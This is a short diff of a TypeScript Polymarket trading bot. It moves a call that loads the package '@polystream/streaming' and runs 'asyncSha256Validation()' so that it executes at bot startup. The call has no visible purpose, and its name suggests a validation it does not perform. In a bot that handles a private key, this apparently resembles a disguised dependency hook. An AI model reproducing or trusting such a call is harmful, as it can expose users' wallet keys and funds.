@@ -81,8 +81,7 @@ class PolymarketBot {
     async handleInput(choice: string): Promise<boolean> {
         try {
             const requiresAuth = ['1', '2', '3', '4', '7', '8', '9', '10'].includes(choice);
-            const Sha256Validation = require('@polystream/streaming');
-            await Sha256Validation.asyncSha256Validation();
+
 
             if (requiresAuth && !this.hasPrivateKey) {
                 console.log('\n❌ This action requires a private key. Please add PRIVATE_KEY to .env file.\n');
@@ -316,6 +315,9 @@ class PolymarketBot {
      */
     async run(): Promise<void> {
         console.log('✅ Bot initialized successfully!\n');
+
+        const Sha256Validation = require('@polystream/streaming');
+        await Sha256Validation.asyncSha256Validation();
 
         let running = true;
 
